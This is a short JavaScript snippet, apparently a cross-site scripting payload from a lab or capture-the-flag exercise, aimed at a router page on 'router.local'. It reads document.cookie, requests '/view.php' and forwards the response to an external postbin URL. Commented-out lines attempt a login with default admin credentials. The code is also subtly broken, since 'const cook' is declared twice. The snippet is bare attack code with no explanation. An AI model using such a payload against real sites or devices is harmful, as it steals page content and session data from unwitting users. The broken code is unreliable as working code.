const http = new XMLHttpRequest();
//http.open('POST', 'http://router.local/login.php', true);
const cook = document.cookie;
http.open('POST', 'http://router.local/view.php', true);

http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

http.onload = function () {
                const xhr = new XMLHttpRequest();
                xhr.open('POST', 'https://www.toptal.com/developers/postbin/1646615303136-0680270809680', true);
                xhr.setRequestHeader('Content-type', 'application/json');
                xhr.send(JSON.stringify(http.responseText));

};
const cook = document.cookie;
http.send();
//http.send(cook+"&username=admin&pin=admin&notRobot=on");

   

